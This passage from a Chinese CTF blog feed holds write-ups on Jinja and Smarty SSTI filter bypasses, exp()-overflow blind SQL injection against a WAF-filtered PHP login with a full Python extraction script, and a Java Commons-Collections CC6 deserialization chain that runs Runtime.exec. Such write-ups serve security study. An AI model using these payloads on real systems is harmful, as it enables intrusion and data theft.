port=<span class="hljs-number">80</span>)<br></code></pre></td></tr></table></figure><p>一道SSTI题目，需要secret_key，根据下面把天命难违改成了个括号，猜测天命难违就是key，</p><p><img src="/./../img/TGCTF/Web/18.png"></p><p>成功执行，确定是SSTI</p><p>构造payload</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">g.pop.__globals__.__builtins__</span>[&#x27;__import__&#x27;](<span class="hljs-name">&#x27;os&#x27;</span>).popen(<span class="hljs-name">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>关键词用引号隔断绕过，由于过滤了下划线，所以用编码绕过</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">name=%E5%A4%A9%E5%91%BDg[<span class="hljs-string">&#x27;p&#x27;</span><span class="hljs-string">&#x27;op&#x27;</span>][<span class="hljs-string">&quot;\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f&quot;</span>][<span class="hljs-string">&quot;\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f&quot;</span>][<span class="hljs-string">&quot;\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f&quot;</span>](<span class="hljs-string">&#x27;so&#x27;</span>[::<span class="hljs-number">-1</span>])[<span class="hljs-string">&#x27;p&#x27;</span><span class="hljs-string">&#x27;open&#x27;</span>](<span class="hljs-string">&#x27;cat tgffff11111aaaagggggggg&#x27;</span>)[<span class="hljs-string">&#x27;r&#x27;</span><span class="hljs-string">&#x27;ead&#x27;</span>]()%E9%9A%BE%E8%BF%9D<br></code></pre></td></tr></table></figure><p><img src="/./../img/TGCTF/Web/19.png"></p><h3 id="火眼辩魑魅"><a href="#火眼辩魑魅" class="headerlink" title="火眼辩魑魅"></a><strong>火眼辩魑魅</strong></h3><p>进入robots.tx发现了很多PHP文件</p><p><img src="/./../img/TGCTF/Web/20.png"></p><p>提示这里面只有一个是能执行的，我们进到tgxff.php看看</p><p><img src="/./../img/TGCTF/Web/21.png"></p><p>非常熟悉的一个页面，结合文件名几乎可以判断是smarty框架的典型问题SSTI</p><p><img src="/./../img/TGCTF/Web/22.png"></p><p>直接在X-Forwarded-For里加命令就好了</p><p><img src="/./../img/TGCTF/Web/23.png"></p>]]></content>
    
    
    <categories>
      
      <category>赛事回顾</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>hatenum题解</title>
    <link href="/2025/04/05/%5BHFCTF%202021%20Final%5Dhatenum/"/>
    <url>/2025/04/05/%5BHFCTF%202021%20Final%5Dhatenum/</url>
    
    <content type="html"><![CDATA[<h1 id="HFCTF-2021-Final-hatenum-题解"><a href="#HFCTF-2021-Final-hatenum-题解" class="headerlink" title="[HFCTF 2021 Final]hatenum 题解"></a>[HFCTF 2021 Final]hatenum 题解</h1><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$host</span> = <span class="hljs-string">&quot;localhost&quot;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$user</span> = <span class="hljs-string">&quot;root&quot;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$pass</span> = <span class="hljs-string">&quot;123456&quot;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$database</span> = <span class="hljs-string">&quot;ctf&quot;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$conn</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;conn = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">mysqli</span>(<span class="hljs-variable">$this</span>-&gt;host,<span class="hljs-variable">$this</span>-&gt;user,<span class="hljs-variable">$this</span>-&gt;pass,<span class="hljs-variable">$this</span>-&gt;database);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">mysqli_connect_errno</span>())&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;connect error&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">find</span>(<span class="hljs-params"><span class="hljs-variable">$username</span></span>)</span>&#123;<br><span class="hljs-variable">$res</span> = <span class="hljs-variable language_">$this</span>-&gt;conn-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&quot;select * from users where username=&#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$res</span>-&gt;num_rows&gt;<span class="hljs-number">0</span>)&#123;<br><span class="hljs-keyword">return</span> True;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">return</span> False;<br>&#125;<br><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">register</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>,<span class="hljs-variable">$code</span></span>)</span>&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;conn-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&quot;insert into users (username,password,code) values (&#x27;<span class="hljs-subst">$username</span>&#x27;,&#x27;<span class="hljs-subst">$password</span>&#x27;,&#x27;<span class="hljs-subst">$code</span>&#x27;)&quot;</span>))&#123;<br><span class="hljs-keyword">return</span> True;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">return</span> False;<br>&#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>,<span class="hljs-variable">$code</span></span>)</span>&#123;<br><span class="hljs-variable">$res</span> = <span class="hljs-variable language_">$this</span>-&gt;conn-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&quot;select * from users where username=&#x27;<span class="hljs-subst">$username</span>&#x27; and password=&#x27;<span class="hljs-subst">$password</span>&#x27;&quot;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;conn-&gt;error)&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$content</span> = <span class="hljs-variable">$res</span>-&gt;<span class="hljs-title function_ invoke__">fetch_array</span>();<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$content</span>[<span class="hljs-string">&#x27;code&#x27;</span>]===<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;code&#x27;</span>])&#123;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-variable">$content</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;success&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;fail&#x27;</span>;<br>&#125;<br>&#125;<br><br>&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sql_waf</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/union|select|or|and|\&#x27;|&quot;|sleep|benchmark|regexp|repeat|get_lock|count|=|&gt;|&lt;| |\*|,|;|\r|\n|\t|substr|right|left|mid/i&#x27;</span>, <span class="hljs-variable">$str</span>))&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Hack detected&#x27;</span>);<br>&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">num_waf</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\d&#123;9&#125;|0x[0-9a-f]&#123;9&#125;/i&#x27;</span>,<span class="hljs-variable">$str</span>))&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Huge num detected&#x27;</span>);<br>&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">array_waf</span>(<span class="hljs-params"><span class="hljs-variable">$arr</span></span>)</span>&#123;<br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$arr</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$value</span>))&#123;<br><span class="hljs-title function_ invoke__">array_waf</span>(<span class="hljs-variable">$value</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-title function_ invoke__">sql_waf</span>(<span class="hljs-variable">$value</span>);<br><span class="hljs-title function_ invoke__">num_waf</span>(<span class="hljs-variable">$value</span>);<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="过滤分析"><a href="#过滤分析" class="headerlink" title="过滤分析"></a>过滤分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sql_waf</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/union|select|or|and|\&#x27;|&quot;|sleep|benchmark|regexp|repeat|get_lock|count|=|&gt;|&lt;| |\*|,|;|\r|\n|\t|substr|right|left|mid/i&#x27;</span>, <span class="hljs-variable">$str</span>))&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Hack detected&#x27;</span>);<br>&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">num_waf</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\d&#123;9&#125;|0x[0-9a-f]&#123;9&#125;/i&#x27;</span>,<span class="hljs-variable">$str</span>))&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Huge num detected&#x27;</span>);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>第一个sqlwaf基本上把能用的sql注入方法禁用了，他在登录时有三种情况，登录成功、登录失败和发生错误，这里可以用错误盲注</p><h3 id="exp函数"><a href="#exp函数" class="headerlink" title="exp函数"></a>exp函数</h3><p>1、MySQL中的exp()函数用于将E提升为指定数字X的幂，这里E(2.718281 …)是自然对数的底数，exp()函数在sql注入里面exp函数一般被用做报错注入（mysql&lt;5.5.53）里面输出报错信息</p><p>2、这里注入利用的是Double溢出，exp(x) 含义为e的x次方，当x&gt;709时就超过了double的取值范围造成报错输出</p><p>3、我们可以用 ~ 运算符按位取反的方式得到一个最大值，该运算符也可以处理一个字符串，经过其处理的字符串会变成大一个很大整数足以超过 Double 数组范围，从而报错输出</p><h2 id="绕过分析"><a href="#绕过分析" class="headerlink" title="绕过分析"></a>绕过分析</h2><p>我们来进行绕过关键字</p><p>盲注通常会用到以下几个关键字:</p><p>字符串截取类（substr）、条件判断类（if）、语句分割类（空格、&#x2F;**&#x2F;）、逻辑运算类（and、or）</p><h3 id="字符串截取类"><a href="#字符串截取类" class="headerlink" title="字符串截取类"></a><strong>字符串截取类</strong></h3><p>禁用：<code>substr、left、right、mid</code></p><p>绕过： <code>like、rlike、instr</code></p><p>其中like与rlike的区别是 rlike支持正则表达式，而like只支持如%，_等有限的通配符，like可以近似于”&#x3D;”</p><h3 id="语句分割"><a href="#语句分割" class="headerlink" title="语句分割"></a><strong>语句分割</strong></h3><p>禁用： 空格、r(%0d)、n(%0a)、t(%09)、&#x2F;**&#x2F;</p><p>语句之间分割常常使用空格</p><p>绕过： %a0（&amp;nbsp）、%0b(垂直制表符)、%0c（换页符）</p><h3 id="逻辑运算"><a href="#逻辑运算" class="headerlink" title="逻辑运算"></a><strong>逻辑运算</strong></h3><p>禁用： and、or、&#x3D;、&gt;、&lt;、regexp</p><p>绕过： &amp;&amp;、||、 like、greatest、least</p><h3 id="条件判断"><a href="#条件判断" class="headerlink" title="条件判断"></a><strong>条件判断</strong></h3><p>禁用： 因为禁用了,，所以if 语句没法使用</p><p>exp()函数除了能用在报错注入以外，利用exp在参数大于709时会报错的特性可以用来构造条件判断语句</p><p>即如果 <code>(... rlike ...)</code> 中的语句执行匹配后的结果为<code>True</code>，经过减号转换后为 <code>exp(710-1)</code> 后不会溢出；若为<code>false</code>，转换为 <code>exp(710-0)</code> 后则会溢出并报错</p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><h3 id="SQL语句拼接"><a href="#SQL语句拼接" class="headerlink" title="SQL语句拼接"></a>SQL语句拼接</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$res</span> = <span class="hljs-variable language_">$this</span>-&gt;conn-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&quot;select * from users where username=&#x27;<span class="hljs-subst">$username</span>&#x27; and password=&#x27;<span class="hljs-subst">$password</span>&#x27;&quot;</span>);<br></code></pre></td></tr></table></figure><p>在过滤我们传入的数据后拼接到SQL语句当中，由于把单引号过滤了，这里无法使用单引号对其进行闭合，所以这里我们把<strong>username</strong>设置为\从而把后面的单引号取过来利用，然后把<strong>password</strong>设置成||1 &amp;&amp;()#</p><p>这样sql语句就变成了</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> username<span class="hljs-operator">=</span>’\’ <span class="hljs-keyword">and</span> password<span class="hljs-operator">=</span>’<span class="hljs-operator">||</span>if(....)#’;<br>username<span class="hljs-operator">=</span> \’ <span class="hljs-keyword">and</span> password<span class="hljs-operator">=</span> <br></code></pre></td></tr></table></figure><h3 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h3><p>接下来就是在password后边的判断处注入我们的payload，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload=<span class="hljs-string">f&quot;||1 &amp;&amp; username rlike 0x61646d69 &amp;&amp; exp(710-(code rlike <span class="hljs-subst">&#123;gethex(ch+a)&#125;</span>))#&quot;</span>.replace(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-built_in">chr</span>(<span class="hljs-number">0x0b</span>))<br></code></pre></td></tr></table></figure><p>由于代码对数字进行的长度限制，这里我们只能三个三个的进行正则匹配，若匹配成功则回显fail，失败则是error</p><h3 id="最终POC"><a href="#最终POC" class="headerlink" title="最终POC"></a>最终POC</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br>url = <span class="hljs-string">&quot;http://40004396-7df7-41d5-970d-85741f792101.node4.buuoj.cn:81/&quot;</span><br>all_chr = string.ascii_letters + string.digits + <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-comment"># /union|select|or|and|\&#x27;|&quot;|sleep|benchmark|regexp|repeat|get_lock|count|=|&gt;|&lt;| |\*|,|;|\r|\n|\t|substr|right|left|mid/i</span><br><span class="hljs-comment"># select * from users where username=&#x27;username&#x27; and password=&#x27;password&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gethex</span>(<span class="hljs-params">raw</span>):<br>    ret = <span class="hljs-string">&#x27;0x&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> raw:<br>        ret += <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(i))[<span class="hljs-number">2</span>:].rjust(<span class="hljs-number">2</span>, <span class="hljs-string">&#x27;0&#x27;</span>)<br>    <span class="hljs-keyword">return</span> ret<br><br>end = <span class="hljs-string">&quot;&quot;</span><br>a=<span class="hljs-string">&quot;^&quot;</span><span class="hljs-comment"># 匹配前面部分</span><br><span class="hljs-comment">#a=&quot;$&quot;# 匹配后面部分</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">24</span>):<br>    <span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> all_chr:<br>        <span class="hljs-comment"># .replace(&#x27; &#x27;, chr(0x0b))或.replace(&#x27; &#x27;, chr(0x0c))都行</span><br>        <span class="hljs-comment"># 匹配前面部分</span><br>        payload = <span class="hljs-string">f&quot;||1 &amp;&amp; username rlike 0x61646d69 &amp;&amp; exp(710-(code rlike <span class="hljs-subst">&#123;gethex(a + ch)&#125;</span>))#&quot;</span>.replace(<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-built_in">chr</span>(<span class="hljs-number">0x0b</span>))<br>        <span class="hljs-comment"># 匹配后面部分</span><br>        <span class="hljs-comment"># payload = f&quot;||1 &amp;&amp; username rlike 0x61646d69 &amp;&amp; exp(710-(code rlike &#123;gethex(ch + a)&#125;))#&quot;.replace(&#x27; &#x27;, chr(0x0b))</span><br><br>        data = &#123;<span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;\\&quot;</span>, <span class="hljs-string">&quot;password&quot;</span>: payload, <span class="hljs-string">&quot;code&quot;</span>: <span class="hljs-string">&quot;&quot;</span>&#125;<br>        req = requests.post(url + <span class="hljs-string">&quot;/login.php&quot;</span>, data=data, allow_redirects=<span class="hljs-literal">False</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;fail&#x27;</span> <span class="hljs-keyword">in</span> req.text:<br>            end += ch<br>            <span class="hljs-built_in">print</span>(a+ch, end)<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(a) == <span class="hljs-number">3</span>:<br>                a = a[<span class="hljs-number">1</span>:] + ch<br>            <span class="hljs-keyword">else</span>:<br>                a += ch<br>            <span class="hljs-keyword">break</span><br><br>data = &#123;<br>    <span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;\\&quot;</span>,<br>    <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;||1#&quot;</span>,<br>    <span class="hljs-string">&quot;code&quot;</span>: <span class="hljs-string">&quot;erghruigh2uygh23uiu32ig&quot;</span><br>&#125;<br><br>req = requests.post(url + <span class="hljs-string">&quot;/login.php&quot;</span>, data=data)<br><br><span class="hljs-built_in">print</span>(req.text)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>刷题日记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>JAVA反序列化CC6链</title>
    <link href="/2025/04/02/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC6%E9%93%BE/"/>
    <url>/2025/04/02/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC6%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<h2 id="0x01环境配置"><a href="#0x01环境配置" class="headerlink" title="0x01环境配置"></a>0x01环境配置</h2><ul><li><p><a href="https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html">Jdk 8u71</a></p></li><li><p>Comoons-Collections 3.2.1</p></li></ul><h2 id="0x02-触发链过程"><a href="#0x02-触发链过程" class="headerlink" title="0x02 触发链过程"></a>0x02 触发链过程</h2><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs scss">HashMap<span class="hljs-selector-class">.readObject</span>()<br>HashMap<span class="hljs-selector-class">.hash</span>()<br>    TiedMapEntry<span class="hljs-selector-class">.hashCode</span>()<br>    TiedMapEntry<span class="hljs-selector-class">.getValue</span>()<br>        LazyMap<span class="hljs-selector-class">.get</span>()<br>            ChainedTransformer<span class="hljs-selector-class">.transform</span>()<br>                InvokerTransformer<span class="hljs-selector-class">.transform</span>()<br>                    Method<span class="hljs-selector-class">.invoke</span>()<br>                        Runtime<span class="hljs-selector-class">.exec</span>()<br><br></code></pre></td></tr></table></figure><h2 id="0X03-过程分析"><a href="#0X03-过程分析" class="headerlink" title="0X03 过程分析"></a>0X03 过程分析</h2><p>CC6链我们主要分析从readObject到LazyMap的get函数，这之后触发的链子可变化的样式较多。</p><h3 id="第一步：LazyMap-transform"><a href="#第一步：LazyMap-transform" class="headerlink" title="第一步：LazyMap-&gt;transform"></a>第一步：LazyMap-&gt;transform</h3><p><img src="/./../img/JavaCc/CC6-1.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map <span class="hljs-title function_">decorate</span><span class="hljs-params">(Map map, Factory factory)</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LazyMap</span>(map, factory);<br>    &#125;<br></code></pre></td></tr></table></figure><p>在LazyMap类中的get()方法调用了transform</p><p>并且可以通过decorate方法给factory赋值</p><p><img src="/./../img/JavaCc/CC6-2.png"></p><h3 id="第二步：TiedMapEntry-get"><a href="#第二步：TiedMapEntry-get" class="headerlink" title="第二步：TiedMapEntry-&gt;get()"></a>第二步：TiedMapEntry-&gt;get()</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getValue</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> map.get(key);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> getValue();<br>    <span class="hljs-keyword">return</span> (getKey() == <span class="hljs-literal">null</span> ? <span class="hljs-number">0</span> : getKey().hashCode()) ^<br>           (value == <span class="hljs-literal">null</span> ? <span class="hljs-number">0</span> : value.hashCode()); <br>&#125;<br></code></pre></td></tr></table></figure><p>在TiedMapEntry中的getValue方法调用了get并且hashCode方法又调用了getValue,所以可以用TiedMapEntry的hashCode方法调用LazyMap的get方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        Transformer[] transformers = &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">ct</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazymap</span> <span class="hljs-operator">=</span> LazyMap.decorate(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>(), ct);<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">entry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazymap, <span class="hljs-string">&quot;1&quot;</span>);<br>        entry.hashCode();<br>    &#125;<br></code></pre></td></tr></table></figure><h3 id="第三步：hashMap"><a href="#第三步：hashMap" class="headerlink" title="第三步：hashMap"></a>第三步：hashMap</h3><p>之前在URLDNS反序列化链当中提到了hashMap的readObject可以会触发hashCode方法，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">putVal(hash(key), key, value, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>);<br></code></pre></td></tr></table></figure><figure class="highlight 